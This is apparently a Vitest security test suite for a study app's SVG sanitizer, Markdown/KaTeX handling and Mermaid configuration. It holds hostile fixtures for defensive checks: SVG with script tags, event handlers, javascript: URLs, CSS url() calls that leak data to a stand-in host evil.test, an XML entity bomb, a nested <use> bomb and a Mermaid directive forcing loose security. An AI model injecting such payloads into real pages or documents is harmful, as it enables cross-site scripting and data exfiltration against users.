import fs from "node:fs";
import path from "node:path";
import { act, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { MemoryRouter } from "react-router";
import { beforeEach, describe, expect, it, vi } from "vitest";

const mermaidMocks = vi.hoisted(() => ({
  initialize: vi.fn(),
  render: vi.fn(async (id: string, chart: string) => ({
    svg: `<svg id="${id}" data-chart="${chart.length}"><g><text>MermaidOK</text></g></svg>`,
  })),
}));

vi.mock("mermaid", () => ({
  default: mermaidMocks,
  ...mermaidMocks,
}));

import { sanitizeSvg } from "../utils/sanitizeSvg";
import { preprocessMarkdown } from "../utils/markdownPreprocess";
import SvgFigureRenderer from "../components/shared/SvgFigureRenderer";
import MarkdownRenderer from "../components/shared/MarkdownRenderer";
import MermaidRenderer from "../components/shared/MermaidRenderer";
import FlashcardView from "../components/study/FlashcardView";
import CardBrowser from "../components/study/CardBrowser";
import FlashcardReviewModal from "../components/shared/FlashcardReviewModal";
import useAppStore from "../stores/appStore";

describe("Wave 1C — Sanitized SVG, Math, Currency & Mermaid Security Suite", () => {
  beforeEach(() => {
    mermaidMocks.initialize.mockClear();
    mermaidMocks.render.mockClear();
    useAppStore.setState({ theme: "dark" });
  });

  describe("1. Constructive SVG Sanitizer & XSS / Exfiltration Neutralization", () => {
    it("strips script, onload, foreignObject/iframe,<a>, <image>, <style>, external CSS url(), and SMIL <set>", () => {
      const hostileSvg = `
        <svg viewBox="0 0 200 120" onload="alert(1)" onclick="evil()" class="fixed inset-0 z-50">
          <script>alert(1)</script>
          <style>body { display: none } input[value^="a"] { background: url(https://evil.test/a) }</style>
          <foreignObject width="100" height="100">
            <iframe src="javascript:alert(1)"></iframe>
          </foreignObject>
          <a href="javascript:alert(1)"><text x="10" y="20">click</text></a>
          <image href="https://evil.test/track.png" x="0" y="0" width="10" height="10" />
          <use href="https://evil.test/sprite.svg#steal" />
          <set attributeName="href" to="javascript:alert(1)" />
          <animate attributeName="x" from="0" to="100" />
          <rect
            x="10"
            y="10"
            width="80"
            height="50"
            fill="url(https://evil.test/paint)"
            marker-end="url(https://evil.test/marker)"
            style="fill: url(https://evil.test/x); background: url(https://evil.test); stroke: #6366f1; stroke-width: 2px; font-family: expression(alert(1)); opacity: @import"
            onmouseover="alert(2)"
          />
          <text x="20" y="40">Safe Diagram Label</text>
        </svg>
      `;

      const { container } = render(<SvgFigureRenderer code={hostileSvg} />);
      const svg = container.querySelector('[data-testid="svg-viewport"] svg');
      expect(svg).toBeInTheDocument();

      // Disallowed tags must be completely absent
      expect(svg?.querySelector("script")).toBeNull();
      expect(svg?.querySelector("style")).toBeNull();
      expect(svg?.querySelector("foreignObject")).toBeNull();
      expect(svg?.querySelector("iframe")).toBeNull();
      expect(svg?.querySelector("a")).toBeNull();
      expect(svg?.querySelector("image")).toBeNull();
      expect(svg?.querySelector("use")).toBeNull();
      expect(svg?.querySelector("set")).toBeNull();
      expect(svg?.querySelector("animate")).toBeNull();

      // Event handlers, class hijacking, and external URLs must be absent everywhere
      const serialized = svg?.outerHTML ?? "";
      expect(serialized).not.toContain("alert(");
      expect(serialized).not.toContain("javascript:");
      expect(serialized).not.toContain("evil.test");
      expect(serialized).not.toContain("onload");
      expect(serialized).not.toContain("onclick");
      expect(serialized).not.toContain("onmouseover");
      expect(serialized).not.toContain("fixed inset-0");
      expect(serialized).not.toContain("display: none");
      expect(serialized).not.toContain("expression");

      // Safe geometry, safe inline style declarations, and safe text survive
      const rect = svg?.querySelector("rect");
      expect(rect).toBeInTheDocument();
      expect(rect?.getAttribute("fill")).toBeNull();
      expect(rect?.getAttribute("marker-end")).toBeNull();
      expect(rect?.style.stroke).toBeTruthy();
      expect(rect?.style.strokeWidth).toBe("2px");
      expect(rect?.style.background).toBe("");
      expect(svg?.textContent).toBe("Safe Diagram Label");
    });

    it("rejects XML <!DOCTYPE / <!ENTITY bombs and >100KB payloads", () => {
      const xxeSvg = `<!DOCTYPE svg [<!ENTITY lol "lol">]><svg viewBox="0 0 10 10"><text>&lol;</text></svg>`;
      expect(sanitizeSvg(xxeSvg, "p1").status).toBe("error");

      const oversized = `<svg viewBox="0 0 10 10"><text>${"A".repeat(100_050)}</text></svg>`;
      expect(sanitizeSvg(oversized, "p1").status).toBe("error");

      const tooManyElements = `<svg viewBox="0 0 10 10">${"<circle r='1'/>".repeat(1005)}</svg>`;
      expect(sanitizeSvg(tooManyElements, "p1").status).toBe("error");
    });

    it("rejects <use> Billion Laughs / nested & cyclic <use> bombs while scoping valid per-instance IDs", () => {
      const billionLaughsUse = `
        <svg viewBox="0 0 100 100">
          <defs>
            <g id="l0"><circle cx="5" cy="5" r="2" /></g>
            <g id="l1"><use href="#l0" /><use href="#l0" /></g>
            <g id="l2"><use href="#l1" /><use href="#l1" /></g>
          </defs>
          <use href="#l2" />
        </svg>
      `;
      const bombResult = sanitizeSvg(billionLaughsUse, "inst");
      expect(bombResult.status).toBe("error");

      const selfCycleUse = `<svg viewBox="0 0 50 50"><g id="loop"><use href="#loop" /></g></svg>`;
      expect(sanitizeSvg(selfCycleUse, "inst").status).toBe("error");

      // Valid local <defs><marker id="arrow"> + <linearGradient> + 1-hop <use> across TWO instances
      const diagramWithDefs = `
        <svg width="240" height="100">
          <defs>
            <marker id="arrow" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto">
              <path d="M0,0 L0,6 L9,3 z" fill="#818cf8" />
            </marker>
            <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#6366f1" />
              <stop offset="100%" stop-color="#2dd4bf" />
            </linearGradient>
            <symbol id="nodeBox">
              <rect x="0" y="0" width="40" height="24" rx="4" fill="url(#grad)" />
            </symbol>
          </defs>
          <use xlink:href="#nodeBox" x="10" y="20" />
          <line x1="55" y1="32" x2="180" y2="32" stroke="#818cf8" stroke-width="2" marker-end="url(#arrow)" />
        </svg>
      `;

      const { container } = render(
        <div>
          <SvgFigureRenderer code={diagramWithDefs} />
          <SvgFigureRenderer code={diagramWithDefs} />
        </div>,
      );

      const svgs = container.querySelectorAll('[data-testid="svg-viewport"] svg');
      expect(svgs.length).toBe(2);

      // Root viewBox synthesized from numeric width/height
      expect(svgs[0].getAttribute("viewBox")).toBe("0 0 240 100");

      const marker0 = svgs[0].querySelector("marker");
      const marker1 = svgs[1].querySelector("marker");
      expect(marker0).not.toBeNull();
      expect(marker1).not.toBeNull();
      expect(marker0!.id).not.toBe("arrow");
      expect(marker1!.id).not.toBe("arrow");
      expect(marker0!.id).not.toBe(marker1!.id);

      const line0 = svgs[0].querySelector("line");
      const line1 = svgs[1].querySelector("line");
      expect(line0?.getAttribute("marker-end")).toBe(`url(#${marker0!.id})`);
      expect(line1?.getAttribute("marker-end")).toBe(`url(#${marker1!.id})`);

      const use0 = svgs[0].querySelector("use");
      const symbol0 = svgs[0].querySelector("symbol");
      expect(use0?.getAttribute("href")).toBe(`#${symbol0!.id}`);
      expect(use0?.getAttribute("xlink:href")).toBeNull();
    });

    it("handles partial streaming XML gracefully without throwing and supports zoom/modal/code controls", () => {
      const partialSvg = `<svg viewBox="0 0 100 100"><circle cx="50"`;
      expect(sanitizeSvg(partialSvg, "stream")).toEqual({ status: "incomplete" });

      const { rerender } = render(<SvgFigureRenderer code={partialSvg} />);
      expect(screen.getByTestId("svg-streaming-fallback")).toHaveTextContent("Rendering diagram...");
      expect(screen.queryByTestId("svg-error-fallback")).toBeNull();

      // Complete the stream -> renders valid SVG + interactive toolbar
      const completeSvg = `<svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="30" fill="#34d399" /></svg>`;
      rerender(<SvgFigureRenderer code={completeSvg} />);
      expect(screen.queryByTestId("svg-streaming-fallback")).toBeNull();

      const viewport = screen.getByTestId("svg-viewport");
      expect(viewport.style.width).toBe("100%");

      fireEvent.click(screen.getByLabelText("Zoom in"));
      expect(viewport.style.width).toBe("125%");

      fireEvent.click(screen.getByLabelText("Reset zoom"));
      expect(viewport.style.width).toBe("100%");

      fireEvent.click(screen.getByLabelText("Zoom out"));
      expect(viewport.style.width).toBe("75%");

      fireEvent.click(screen.getByLabelText("Expand figure"));
      expect(screen.getByTestId("svg-expanded-modal")).toBeInTheDocument();
      fireEvent.click(screen.getByLabelText("Minimize figure"));
      expect(screen.queryByTestId("svg-expanded-modal")).toBeNull();

      fireEvent.click(screen.getByLabelText("View SVG source"));
      expect(screen.getByTestId("svg-raw-source")).toHaveTextContent(completeSvg);
    });
  });

  describe("2. Fence-Safe Markdown Preprocessing, Offline KaTeX & Currency Protection", () => {
    it("removes external jsDelivr KaTeX CDN link from index.html for 100% airgapped operation", () => {
      const indexHtml = fs.readFileSync(path.resolve(process.cwd(), "index.html"), "utf8");
      expect(indexHtml).not.toContain("cdn.jsdelivr.net/npm/katex");
    });

    it("keeps SQL and Python asterisks inside fenced and inline code 100% byte-identical", () => {
      const sqlAndPython = [
        "Query example:",
        "```sql",
        "SELECT * FROM users WHERE a = 1;",
        "```",
        "And Python exponentiation:",
        "~~~python",
        "x = 2 ** 10 ** 2",
        "cost = '$150/mo'",
        "~~~",
        "Inline SQL `SELECT * FROM users WHERE a = 1` and `x = 2 ** 10 ** 2`.",
      ].join("\n");

      const processed = preprocessMarkdown(sqlAndPython);
      expect(processed).toContain("SELECT * FROM users WHERE a = 1;");
      expect(processed).toContain("x = 2 ** 10 ** 2");
      expect(processed).toContain("`SELECT * FROM users WHERE a = 1`");
      expect(processed).toContain("`x = 2 ** 10 ** 2`");
      expect(processed).toContain("cost = '$150/mo'");

      const { container } = render(<MarkdownRenderer content={sqlAndPython} />);
      expect(container.textContent).toContain("SELECT * FROM users WHERE a = 1;");
      expect(container.textContent).toContain("x = 2 ** 10 ** 2");
    });

    it("renders \\(...\\) and \\[...\\] as KaTeX DOM nodes while preserving prose currency and digit-leading math", () => {
      const mathDoc =
        "Pythagoras: \\(a^2 + b^2 = c^2\\) and integral: \\[\\int_0^1 x\\,dx = \\frac{1}{2}\\]";
      const { container: mathContainer } = render(<MarkdownRenderer content={mathDoc} />);
      expect(mathContainer.querySelectorAll(".katex").length).toBe(2);
      expect(mathContainer.querySelector(".katex-display")).not.toBeNull();

      // Prose currency must NOT trigger KaTeX or swallow spaces
      const currencyProse =
        "RDS costs $150/mo vs $400/mo ($400/yr promo, $0.02/GB storage, $10k to $5M budget, $50 - $100/day, or $1,200 flat).";
      const { container: proseContainer } = render(<MarkdownRenderer content={currencyProse} />);
      expect(proseContainer.querySelectorAll(".katex").length).toBe(0);
      expect(proseContainer.textContent).toContain("RDS costs $150/mo vs $400/mo");
      expect(proseContainer.textContent).toContain("$0.02/GB");
      expect(proseContainer.textContent).toContain("$10k to $5M");
      expect(proseContainer.textContent).toContain("$50 - $100/day");
      expect(proseContainer.textContent).toContain("$1,200");

      // Digit-leading math MUST still render as KaTeX
      const digitMath =
        "Address space is $2^{32}$ bytes, latency is $10^{-9}$ s, ops $10^6$, odd $2n + 1$, probability $0 \\le p \\le 1$.";
      const { container: digitMathContainer } = render(<MarkdownRenderer content={digitMath} />);
      expect(digitMathContainer.querySelectorAll(".katex").length).toBe(5);
      expect(digitMathContainer.textContent).toContain("Address space is");
      expect(digitMathContainer.textContent).toContain("bytes");
    });

    it("renders language-svg fenced blocks inside MarkdownRenderer including mid-stream unclosed fences", () => {
      const streamingMd = "Diagram incoming:\n```svg\n<svg viewBox=\"0 0 100 100\"><circle cx=\"50\"";
      const { container, rerender } = render(<MarkdownRenderer content={streamingMd} />);
      expect(screen.getByTestId("svg-streaming-fallback")).toBeInTheDocument();

      const finishedMd =
        "Diagram incoming:\n```svg\n<svg viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"25\" fill=\"#818cf8\"/></svg>\n```";
      rerender(<MarkdownRenderer content={finishedMd} />);
      expect(container.querySelector('[data-testid="svg-viewport"] circle')).not.toBeNull();
    });
  });

  describe("3. MermaidRenderer Strict Security & Live Theme Synchronization", () => {
    it("initializes Mermaid with securityLevel: 'strict', locked secure keys, and syncs dark/light theme", async () => {
      const maliciousDirectiveChart = `%%{init: {"securityLevel": "loose"}}%%\ngraph TD\n  A-->B`;
      render(<MermaidRenderer chart={maliciousDirectiveChart} />);

      await waitFor(() => {
        expect(mermaidMocks.initialize).toHaveBeenCalledWith(
          expect.objectContaining({
            startOnLoad: false,
            securityLevel: "strict",
            secure: ["secure", "securityLevel", "startOnLoad", "maxTextSize"],
            theme: "dark",
          }),
        );
      });

      act(() => {
        useAppStore.setState({ theme: "light" });
      });

      await waitFor(() => {
        expect(mermaidMocks.initialize).toHaveBeenLastCalledWith(
          expect.objectContaining({
            securityLevel: "strict",
            secure: ["secure", "securityLevel", "startOnLoad", "maxTextSize"],
            theme: "default",
          }),
        );
      });
    });
  });

  describe("4. Flashcard Rich Markdown, KaTeX & Sanitized SVG Rendering", () => {
    it("renders KaTeX formulas and sanitized language-svg figures in FlashcardView and CardBrowser", () => {
      const richCards = [
        {
          id: "card-rich-1",
          front: "What is the binary search recurrence and tree shape? \\(T(n) = T(n/2) + O(1)\\)",
          back: [
            "Depth is $O(\\log_2 n)$.",
            "```svg",
            '<svg viewBox="0 0 120 60"><circle cx="60" cy="20" r="10" fill="#818cf8" /><script>alert(1)</script></svg>',
            "```",
          ].join("\n"),
          state: 0,
        },
      ];

      const { container } = render(
        <MemoryRouter>
          <FlashcardView cards={richCards} deckName="Algorithms" onBack={vi.fn()} />
        </MemoryRouter>,
      );

      // Front renders KaTeX formula
      expect(container.querySelector(".flashcard-front .katex")).not.toBeNull();

      // Back renders KaTeX formula + sanitized SVG figure without <script>
      expect(container.querySelector(".flashcard-back .katex")).not.toBeNull();
      const backSvg = container.querySelector('.flashcard-back [data-testid="svg-viewport"] svg');
      expect(backSvg).not.toBeNull();
      expect(backSvg?.querySelector("circle")).not.toBeNull();
      expect(backSvg?.querySelector("script")).toBeNull();

      // CardBrowser also renders rich Markdown/KaTeX cleanly
      const { container: browserContainer } = render(
        <CardBrowser
          deck={{ id: "d1", name: "Algorithms", cards: richCards }}
          onBack={vi.fn()}
          onSaveCard={vi.fn()}
          onDeleteCard={vi.fn()}
          onAddCard={vi.fn()}
        />,
      );
      expect(browserContainer.querySelectorAll(".katex").length).toBeGreaterThanOrEqual(2);

      // FlashcardReviewModal also renders rich Markdown/KaTeX/SVG cleanly
      const { container: modalContainer } = render(
        <FlashcardReviewModal
          open={true}
          onClose={vi.fn()}
          cards={richCards}
          topicName=""
          pillarId="compute"
          topicId="algos"
        />,
      );
      expect(modalContainer.querySelectorAll(".katex").length).toBeGreaterThanOrEqual(2);
      expect(modalContainer.querySelector('[data-testid="svg-viewport"] circle')).not.toBeNull();
    });
  });
});
